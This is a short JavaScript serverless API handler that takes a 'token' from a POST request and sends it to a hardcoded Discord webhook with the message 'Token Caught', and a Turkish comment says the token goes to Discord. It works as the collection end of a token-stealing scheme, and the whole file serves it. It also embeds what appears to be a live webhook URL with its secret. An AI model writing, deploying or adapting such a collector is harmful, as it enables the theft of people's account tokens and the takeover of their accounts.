export default async function handler(req, res) {
 if (req.method === 'POST') {
 const { token } = req.body;
 
 if (token) {
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd";
 
 try {
 // Token'ı Discord'a gönder
 await fetch(WEBHOOK_URL, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ content: `🚩 Token Caught: ${token}` })
 });
 res.status(200).json({ success: true });
 } catch (error) {
 res.status(500).json({ error: 'Webhook failed' });
 }
 } else {
 res.status(400).json({ error: 'No token provided' });
 }
 } else {
 res.status(405).json({ error: 'Method not allowed' });
 }
}
